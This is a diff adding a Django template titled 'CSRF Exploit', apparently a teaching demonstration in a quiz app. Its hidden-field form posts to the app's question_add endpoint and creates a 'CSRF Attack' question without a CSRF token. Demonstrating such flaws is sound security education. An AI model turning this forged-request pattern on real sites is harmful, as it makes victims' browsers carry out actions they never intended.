@@ -1,0 +1,17 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<h1>CSRF Exploit</h1>
+
+<p>This page should be in another domain, but the purpose of this is to show how without the CSRF token we are able to
+    do create a new answer</p>
+<p>Click on the button below to exploit the CSRF vulnerability in the quiz app.</p>
+<p>A new question with name CSRF Attack will be added to quiz {{ quiz_name }} with ID {{ quiz_id }}</p>
+
+<form method="post" action="{% url 'question_add' quiz_id=quiz_id %}" enctype="multipart/form-data" class="form-group">
+    <input type="hidden" name="text" value="CSRF Attack" class="form-control">
+    <input type="hidden" name="quiz_id" value="{{ quiz_id }}">
+    <button type="submit" class="btn btn-primary">Get CSRF Hacked</button>
+</form>
+
+{% endblock %}
